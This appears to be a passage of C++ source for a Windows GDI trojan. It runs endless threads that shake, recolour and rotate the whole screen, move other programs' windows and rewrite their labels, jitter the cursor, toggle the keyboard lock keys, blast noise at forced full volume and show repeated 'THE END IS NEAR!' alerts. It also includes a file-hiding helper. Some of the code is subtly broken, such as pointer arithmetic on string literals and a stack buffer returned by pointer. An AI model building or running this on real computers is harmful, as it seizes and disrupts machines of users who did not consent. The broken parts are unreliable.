/* ORIGINAL CODE:
   BelkasPro and N17Pro3426
*/

#include <windows.h>
#include <vector>
#pragma comment(lib, "winmm.lib")
#define _USE_MATH_DEFINES 1
#include <cmath>
#define PI 3.14159265358979
#pragma comment(lib, "msimg32.lib")
#pragma comment(lib, "advapi32.lib")
#include <time.h>
#include <stdlib.h>

struct WindowState {
	HWND hwnd;
	int originalX, originalY;
	float offset;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
	if (IsWindowVisible(hwnd) && GetWindowTextLength(hwnd) > 0) {
		std::vector<HWND>* windows = (std::vector<HWND>*)lParam;
		windows->push_back(hwnd);
	}
	return TRUE;
}

typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;

namespace Math
{
	FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
	{
		return a * sin(2 * PI * b * c / d);
	}
}

struct Point3D {
	float x, y, z;
};

struct Point2D {
	int x, y;
};

#define SIZE 100.0f
#define PI 3.14159265359f

typedef struct
{
	FLOAT h;
	FLOAT s;
	FLOAT v;
} HSV;

namespace System
{
	VOID RedrawScreen(VOID)
	{
		RedrawWindow(NULL, NULL, NULL, RDW_INVALIDATE | RDW_ERASE | RDW_ALLCHILDREN);
	}

	VOID EndPayload(HANDLE hPayload, HANDLE hPML)
	{
		TerminateThread(hPayload, NULL);
		CloseHandle(hPayload);
		HeapDestroy(hPML);
	}

	LPCWSTR GetCurrentFileDir()
	{
		WCHAR buffer[MAX_PATH];
		GetModuleFileName(NULL, buffer, MAX_PATH);
		return (LPCWSTR)buffer;
	}

	VOID HideFile(LPCWSTR orgPathFile)
	{
		SetFileAttributesW(orgPathFile, FILE_ATTRIBUTE_HIDDEN);
	}

	VOID PressKey(WORD key, INT time)
	{
		INPUT pInputs = { 0 };
		pInputs.type = INPUT_KEYBOARD;
		pInputs.ki.wVk = key;
		SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
		Sleep(time);
		pInputs.ki.dwFlags = KEYEVENTF_KEYUP;
		SendInput(1, (LPINPUT)&pInputs, sizeof(INPUT));
	}

	BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam)
	{
		const WCHAR* labelText = L"" + rand() % 512;
		if (GetWindowLongW(hwnd, GWL_STYLE) & WS_VISIBLE)
		{
			SendMessageW(hwnd, WM_SETTEXT, 0, (LPARAM)labelText);
		}
		return true;
	}
}

DWORD consent = 0x00000001;

namespace Payloads
{
	DWORD WINAPI labels(LPVOID lpvd)
	{
		while (true)
		{
			HWND hwnd = FindWindowW(NULL, L"" + rand() % 512);
			EnumChildWindows(hwnd, System::EnumChildProc, NULL);
		}
	}

	DWORD WINAPI bouncing(LPVOID lpvd)
	{
		std::vector<HWND> windowHandles;
		float timer = 0;

		while (true) {
			windowHandles.clear();
			EnumWindows(EnumWindowsProc, (LPARAM)&windowHandles);

			for (HWND hwnd : windowHandles) {
				RECT rect;
				GetWindowRect(hwnd, &rect);

				int jump = (int)(sin(timer + (UINT_PTR)hwnd) * 10);

				SetWindowPos(hwnd, NULL, rect.left, rect.top + jump, 0, 0, SWP_NOSIZE | SWP_NOZORDER | SWP_NOACTIVATE);
			}

			timer += 0.5f;
			Sleep(30);
		}

		return 0;

	}

	//Show a message each 10 minutes
	DWORD WINAPI timemsg(LPVOID lpvd)
	{
		while (true)
		{
			//10 minutes
			Sleep(600000);
			MessageBoxW(NULL, L"THE END IS NEAR!", L"THE END IS NEAR!", MB_OK | MB_ICONEXCLAMATION);
		}

		return 0x00;
	}

	//Blink the LEDs of your keyboard
	DWORD WINAPI keyboard(LPVOID lpvd)
	{
		while (true)
		{
			System::PressKey(VK_NUMLOCK, 1000);
			System::PressKey(VK_CAPITAL, 1000);
			System::PressKey(VK_SCROLL, 1000);
		}
		return 0x00;
	}
}

namespace Colors
{
	RGBQUAD HSVtoRGB(HSV hsv)
	{
		int hi = (int)floor(hsv.h / 60.0) % 6;
		double f = hsv.h / 60.0 - floor(hsv.h / 60.0);
		double p = hsv.v * (1.0 - hsv.s);
		double q = hsv.v * (1.0 - f * hsv.s);
		double t = hsv.v * (1.0 - (1.0 - f) * hsv.s);

		switch (hi)
		{
		case 0:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255) };
		case 1:
			return { static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255) };
		case 2:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(t * 255) };
		case 3:
			return { static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255), static_cast<BYTE>(hsv.v * 255) };
		case 4:
			return { static_cast<BYTE>(t * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(hsv.v * 255) };
		default:
			return { static_cast<BYTE>(hsv.v * 255), static_cast<BYTE>(p * 255), static_cast<BYTE>(q * 255) };
		}
	}

	HSV RGBtoHSV(RGBQUAD rgbquad)
	{
		HSV hsv;

		double rd = rgbquad.rgbRed / 255.0;
		double gd = rgbquad.rgbGreen / 255.0;
		double bd = rgbquad.rgbBlue / 255.0;

		double cmax = max(max(rd, gd), bd);
		double cmin = min(min(rd, gd), bd);
		double delta = cmax - cmin;

		hsv.v = cmax;

		if (cmax > 0.0)
			hsv.s = delta / cmax;
		else
			hsv.s = 0.0;

		if (delta > 0.0)
		{
			if (cmax == rd)
				hsv.h = 60.0 * fmod((gd - bd) / delta, 6.0);
			else if (cmax == gd)
				hsv.h = 60.0 * ((bd - rd) / delta + 2.0);
			else if (cmax == bd)
				hsv.h = 60.0 * ((rd - gd) / delta + 4.0);

			if (hsv.h < 0.0)
				hsv.h += 360.0;
		}
		else
		{
			hsv.h = 0.0;
		}

		return hsv;
	}
}

int w = GetSystemMetrics(0);
int h = GetSystemMetrics(1);
int shakeIntensity = 1;
int warpIntensity = 3;
int waveDelay = rand() % 30;
bool random = true;
int colorsdelay = 50;

namespace Bytebeats
{
	DWORD WINAPI alpha(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD c = 0;
		DWORD e = 0;

		FLOAT volume = 0.0;
		FLOAT dx = 0.6;

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				if (c == 35000)
				{
					c = 0;
					e++;

					dx += 0.1;

					if (dx > 0.7) dx = 0.5;

					if (e % 10 && volume != 3)
					{
						volume += 0.1;
					}
				}

				DWORD d = c * dx;

				DWORD freq = d % 33;

				DWORD sound = c & freq % 487;

				sbuffer[t] = sound * volume;

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		return 0x00;
	}

	DWORD WINAPI beta(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{

				DWORD d = (t & 1) * 4;

				DWORD freq = (d | d << 2) >> 70;

				DWORD sound = t | (freq | t) % 430;

				sbuffer[t] = sound * 0.5;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		return 0x00;
	}

	DWORD WINAPI gamma(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				DWORD freq = Math::SineWave(10, t % 1000, 1, 1000);

				sbuffer[t] = t ^ (freq % 5);
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		return 0x00;
	}

	//Quantification
	DWORD WINAPI soundA(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				DWORD wave = Math::SineWave(1, t, 1, wfx.nSamplesPerSec);

				DWORD freq = ((wave | t) * 967);

				sbuffer[t] = t | (freq | t) % 500;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		return 0x00;
	}

	//Blocky thing
	DWORD WINAPI soundC(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				DWORD c = t * 4;

				DWORD freq = (c | c << 3) >> 97;

				sbuffer[t] = t | (freq | t) % 560;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);
		}

		return 0x00;
	}

	//Descending and Ascending
	DWORD WINAPI soundB(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD c = 0;
		FLOAT d = 4.9;
		DWORD e = 0;

		BOOL statementA = TRUE; //4.9 -> 4.1
		BOOL statementB = FALSE; //3.2 -> 3.8
		BOOL statementC = FALSE; //3.8 -> 3.2

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				//d = 4.9
				if (statementA && c == 10000)
				{
					c = 0;
					d -= 0.1;

					if (d <= 3.8)
					{
						d = 3.4;
						e++;

						if (e == 3)
						{
							statementA = false;
							statementB = true;

							d = 3.2;
							e = 0;
						}
					}
				}

				//d = 3.2
				if (statementB && c == 10000)
				{
					c = 0;
					d += 0.1;

					if (d >= 3.5)
					{
						d = 3.1;
						e++;

						if (e == 3)
						{
							statementB = false;
							statementC = true;

							d = 3.4;
							e = 0;
						}
					}
				}

				//d = 3.8
				if (statementC && c == 10000)
				{
					c = 0;
					d -= 0.1;

					if (d <= 3.1)
					{
						d = 3.9;
						e++;

						if (e == 2)
						{
							statementC = false;
							statementA = true;

							d = 4.9;
							e = 0;
						}
					}
				}

				int dx = c * d;
				int freq = dx % 467;

				double sound = c | freq % 100000;

				sbuffer[t] = sound;

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);
		}

		return 0x00;
	}

	//Final bytebeat
	DWORD WINAPI noise(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 44100, 44100, 1, 8, 0 }; // Используем 44100 Гц для лучшего качества

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD c = 0;

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				// Случайно выбираем высокую или низкую частоту
				DWORD freq = (rand() % 2 == 0) ? (rand() % 50 + 1) : (rand() % 200 + 50); // Низкая (1-50) или высокая (50-250)

				// Генерация значения в sbuffer с учетом частоты
				sbuffer[t] = (BYTE)((c + freq) % 256); // Изменяем значение в зависимости от частоты

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * (rand() % 3 + 1)); // Случайная задержка от 1 до 3 секунд
		}

		waveOutClose(hWaveOut); // Закрываем устройство после завершения работы
		return 0x00;
	}

	//Exponential Siren
	DWORD WINAPI exponential(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD c = 0;

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				//if (c == 900000)
				//{
					//c = 0;
				//}

				double wave = Math::SineWave(1, c * 0.0311, (c & 32717), wfx.nSamplesPerSec * 2);

				sbuffer[t] = (int(wave * 0xA) & 0xF1FF);

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);
		}

		return 0x00;
	}


	DWORD WINAPI decrescendo(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		DWORD dx = 0;

		DWORD c = 0;

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				if (c == 100000)
				{
					c = 0;
				}

				DWORD offset = c + 17000;

				double freq = (8 * sizeof(sbuffer)) / offset;

				sbuffer[t] = Math::SineWave(freq, 2, offset, 4000);
				sbuffer[t] *= 3;

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(0xFFFF, 0xFFFF));

			Sleep(1000 * 31);
		}

		return 0x00;
	}

	//Chaos
	DWORD WINAPI sound2(LPVOID lpvd)
	{
		DWORD counter = 44000;
		DWORD d = 0;
		DWORD c = 0;

		BOOL statement = TRUE;

		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32100, 32100, 1, 8, 0 };
		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60];

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				if (c == counter)
				{
					if (statement)
					{
						d++;

						if (d == 11)
						{
							statement = FALSE;
						}
					}

					if (!statement)
					{
						d--;

						if (d == 0)
						{
							statement = TRUE;
						}
					}

					if (counter == 469) d = rand() % 10;

					if (counter > 1000) counter -= 1000;
					if (counter <= 1000) counter -= 50;

					if (counter == 0) counter = 500;

					c = 0;
				}

				int freq = c * (3 + ((float)d / (float)10));
				sbuffer[t] = t | freq % 478;

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };
			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutSetVolume(hWaveOut, MAKELONG(65535, 65535));

			Sleep(1000 * 31);
		}

		return 0x00;
	}

	DWORD WINAPI sound1(LPVOID lpvd)
	{
		HWAVEOUT hWaveOut = 0;
		WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 }; // Установлено на 8000 Гц

		waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);

		BYTE sbuffer[17000 * 60]; // Размер буфера
		DWORD c = 0;
		FLOAT volume = 0.0;
		DWORD volumeIncrementInterval = 2000; // Интервал увеличения громкости в миллисекундах
		DWORD lastVolumeIncreaseTime = 0; // Время последнего увеличения громкости

		while (true)
		{
			for (DWORD t = 0; t < sizeof(sbuffer); t++)
			{
				// Ваш bytebeat алгоритм
				BYTE sound = (c >> 56 | (c >> 6) * (c >> 7)) & 0xFF;

				// Увеличение громкости каждые 2 секунды
				DWORD currentTime = GetTickCount();
				if (currentTime - lastVolumeIncreaseTime >= volumeIncrementInterval)
				{
					lastVolumeIncreaseTime = currentTime; // Обновляем время последнего увеличения

					volume += 0.1;
					if (volume > 1.0) volume = 10.0; // Ограничиваем до 1.0
					waveOutSetVolume(hWaveOut, MAKELONG((DWORD)(volume * 0xFFFF), (DWORD)(volume * 0xFFFF)));
				}

				sbuffer[t] = sound * volume * 255; // Умножаем на 255 для корректного значения звука

				c++;
			}

			WAVEHDR header = { (LPSTR)sbuffer, sizeof(sbuffer), 0, 0, 0, 0, 0, 0 };

			waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
			waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));

			Sleep(1000 * 31); // Задержка перед следующим циклом

			waveOutReset(hWaveOut);
			waveOutUnprepareHeader(hWaveOut, &header, sizeof(header));
		}

		waveOutClose(hWaveOut);
		return 0x00;
	}
}

namespace GDIPayloads
{
	DWORD WINAPI cursor(LPVOID lpParam) {
		POINT cursor;
		while (1) {
			GetCursorPos(&cursor);
			int X = cursor.x + rand() % 3 - 1;
			int Y = cursor.y + rand() % 3 - 1;
			SetCursorPos(X, Y);
			//BlockInput(true);
			//Sleep(10);
		}
		return(1);
	}
	DWORD WINAPI shake(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		HBITMAP bmp = CreateCompatibleBitmap(dc, w, h);
		SelectObject(dcCopy, bmp);

		while (1)
		{
			dc = GetDC(NULL);
			for (int i = 1; i <= shakeIntensity; i++)
			{
				StretchBlt(dcCopy, rand() % 3, rand() % 3, w, h, dc, rand() % 3, rand() % 3, w, h, SRCCOPY);
				StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, w, h, SRCCOPY);
			}

			if (shakeIntensity < 10)
			{
				Sleep(rand() % 25);
			}
			else
			{
				Sleep(rand() % 5);
			}

			if (rand() % 25 == 24) System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//COLOR OVERDOSE
	DWORD WINAPI overdose(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 16;
		int hs = h / 16;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		//Counter variable
		INT i = 0;

		while (1)
		{
			dc = GetDC(NULL);
			HBRUSH hBrush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
			SelectObject(dcCopy, hBrush);
			SelectObject(dc, hBrush);

			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCPAINT | PATINVERT);

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int i = rand() % 10;

					rgbquad[index].rgbRed += i;
					rgbquad[index].rgbGreen += i;
					rgbquad[index].rgbBlue += i;
				}
			}

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCPAINT | PATINVERT);

			Sleep(rand() % 10);
			System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//XOR ROTOZOOMER
	DWORD WINAPI xorroto(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;
		DOUBLE angle = 0.f;

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					//CenterX and CenterY
					int cx = (x - (ws / 2));
					int cy = (y - (hs / 2));

					//2D Rotating Matrix
					int zx = cos(angle) * cx - sin(angle) * cy;
					int zy = sin(angle) * cx + cos(angle) * cy;

					//XOR Pattern
					int fx = (zx + i) ^ (zy + i);

					rgbquad[index].rgbRed += fx;
					rgbquad[index].rgbGreen += fx;
					rgbquad[index].rgbBlue += fx;
				}
			}

			i++; angle += 0.01f;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 10);
			System::RedrawScreen();

			if (rand() % 25 == 0 && random)
			{
				Sleep(1000);
			}
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//XOR ABS ROTOZOOMER
	DWORD WINAPI absroto(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;
		DOUBLE angle = 0.f;

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int cx = abs(x - (ws / 2));
					int cy = abs(y - (hs / 2));

					int zx = cos(angle) * cx - sin(angle) * cy;
					int zy = sin(angle) * cx + cos(angle) * cy;

					int fx = (zx + i) ^ (zy + i);

					rgbquad[index].rgbRed += fx;
					rgbquad[index].rgbGreen += fx;
					rgbquad[index].rgbBlue += fx;
				}
			}

			i++; angle += 0.01f;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 10);
			System::RedrawScreen();

			if (rand() % 25 == 0 && random)
			{
				Sleep(1000);
			}
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//XOR ABS ROTOZOOMER HALFTONE
	DWORD WINAPI halftone(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 4;
		int hs = h / 4;

		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		INT i = 0;
		DOUBLE angle = 0.f;

		//Just added a HALFTONE effect
		SetStretchBltMode(dcCopy, HALFTONE);
		SetStretchBltMode(dc, HALFTONE);

		while (1)
		{
			dc = GetDC(NULL);
			StretchBlt(dcCopy, 0, 0, ws, hs, dc, 0, 0, w, h, SRCCOPY);

			RGBQUAD rgbquadCopy;

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					int cx = abs(x - (ws / 2));
					int cy = abs(y - (hs / 2));

					int zx = cos(angle) * cx - sin(angle) * cy;
					int zy = sin(angle) * cx + cos(angle) * cy;

					int fx = (zx + i) ^ (zy + i);

					rgbquad[index].rgbRed += fx;
					rgbquad[index].rgbGreen += fx;
					rgbquad[index].rgbBlue += fx;
				}
			}

			i++; angle += 0.01f;

			StretchBlt(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, SRCCOPY);

			Sleep(rand() % 10);
			System::RedrawScreen();
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//ALPHABLEND DARK
	DWORD WINAPI initial(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
		HDC dcCopy = CreateCompatibleDC(dc);

		int ws = w / 8;
		int hs = h / 8;

		BLENDFUNCTION blur = { 0 };
		BITMAPINFO bmpi = { 0 };
		HBITMAP bmp;

		bmpi.bmiHeader.biSize = sizeof(bmpi);
		bmpi.bmiHeader.biWidth = ws;
		bmpi.bmiHeader.biHeight = hs;
		bmpi.bmiHeader.biPlanes = 1;
		bmpi.bmiHeader.biBitCount = 32;
		bmpi.bmiHeader.biCompression = BI_RGB;

		RGBQUAD* rgbquad = NULL;

		bmp = CreateDIBSection(dc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(dcCopy, bmp);

		//Set our blur
		blur.BlendOp = AC_SRC_OVER;
		blur.BlendFlags = 0;
		blur.AlphaFormat = 0;
		blur.SourceConstantAlpha = 20;

		//Counter variable
		INT i = 0;

		while (1)
		{
			//Random position at the memory
			dc = GetDC(NULL);
			StretchBlt(dcCopy, rand() % 1, rand() % 1, ws, hs, dc, rand() % -1, rand() % -1, w, h, SRCCOPY);

			for (int x = 0; x < ws; x++)
			{
				for (int y = 0; y < hs; y++)
				{
					int index = y * ws + x;

					rgbquad[index].rgbRed += i;
					rgbquad[index].rgbGreen += i;
					rgbquad[index].rgbBlue += i;
				}
			}

			i++;

			Sleep(rand() % 500);
			AlphaBlend(dc, 0, 0, w, h, dcCopy, 0, 0, ws, hs, blur);

			if (rand() % 5 == 0)
			{
				System::RedrawScreen();
			}
			ReleaseDC(0, dc);
		}

		return 0x00;
	}

	//Random Texts
	DWORD WINAPI texts(LPVOID lpvd)
	{
		HDC dc = GetDC(NULL);
